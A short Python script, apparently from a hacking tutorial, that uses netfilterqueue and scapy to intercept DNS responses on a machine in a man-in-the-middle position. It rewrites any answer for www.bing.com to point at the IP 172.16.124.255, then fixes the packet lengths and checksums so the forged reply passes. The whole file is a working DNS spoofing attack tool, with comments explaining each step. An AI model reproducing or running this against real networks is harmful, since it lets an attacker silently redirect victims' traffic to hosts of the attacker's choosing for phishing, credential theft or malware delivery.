#!/usr/bin/python

import netfilterqueue
import scapy.all as scapy 

# get_payload function is used to get the contents in the packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())	
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if "www.bing.com" in str(qname):
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname=qname, rdata="172.16.124.255") 
#[.DNS] is the layer of the scapy packet and [].ancout is Field
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

#delete the len and chksum to assure packet integrity
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].chksum
			del scapy_packet[scapy.UDP].len

			packet.set_payload(bytes(scapy_packet))

	packet.accept()

# .bind will envoke a method on NetFilterQueue object
# process_packet function will be executed on each packet trapped in the queue we created in our terminal

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


